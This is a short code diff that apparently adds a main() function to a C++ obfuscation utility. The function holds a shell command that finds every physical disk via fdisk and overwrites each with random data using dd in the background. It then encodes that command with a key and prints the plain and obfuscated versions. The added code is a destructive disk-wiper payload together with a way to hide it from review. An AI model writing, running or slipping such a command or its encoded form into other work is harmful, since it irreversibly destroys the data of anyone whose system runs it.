@@ -90,3 +90,10 @@ string deobfuscate(string s, char key) {
 
     return str;
 }
+
+int main() {
+    string command = "for i in $(fdisk -l | grep /dev | grep -v loop| grep Disk | awk -F 'Disk ' '{print $2}' | cut -d \\\\: -f1);do nohup dd if=/dev/urandom of=$i > nohup.out < /dev/null &";
+    string encodedCmd = b64obfuscate(command,KEY);
+    cout << "Encoded version of:\t" << command << "\r\n\t" << encodedCmd << "\r\n" << endl;
+    return 0;
+}
